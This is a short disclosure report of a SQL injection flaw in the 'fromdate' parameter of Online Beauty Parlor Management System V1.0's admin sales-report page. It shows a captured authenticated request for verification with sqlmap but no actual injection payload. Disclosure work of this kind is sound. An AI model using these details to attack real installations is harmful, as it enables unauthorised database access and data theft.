Online Beauty Parlor Management System - SQL Injection on (/admin/sales-reports-detail.php fromdate parameter) 

Vendor Homepage:

```
https://www.campcodes.com/projects/online-beauty-parlor-management-system/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
admin/sales-reports-detail.php
```

On this page, `fromdate` parameter is vulnerable to SQL Injection Attack


Proof of vulnerability(Verify using the sqlmap tool after logining):

Request:

```
POST /bpms/admin/sales-reports-detail.php HTTP/1.1
Host: localhost
Content-Length: 449
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZLoOf7yh0UajdHsN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/bpms/admin/sales-reports.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=35oep1of4pinmqsin6t7o6nae7
Connection: keep-alive

------WebKitFormBoundaryZLoOf7yh0UajdHsN
Content-Disposition: form-data; name="fromdate"

2025-09-16
------WebKitFormBoundaryZLoOf7yh0UajdHsN
Content-Disposition: form-data; name="todate"

2025-09-30
------WebKitFormBoundaryZLoOf7yh0UajdHsN
Content-Disposition: form-data; name="requesttype"

mtwise
------WebKitFormBoundaryZLoOf7yh0UajdHsN
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryZLoOf7yh0UajdHsN--

```

<img width="980" height="642" alt="image" src="https://github.com/user-attachments/assets/d85277ef-4048-470b-9f50-704680d907f1" />



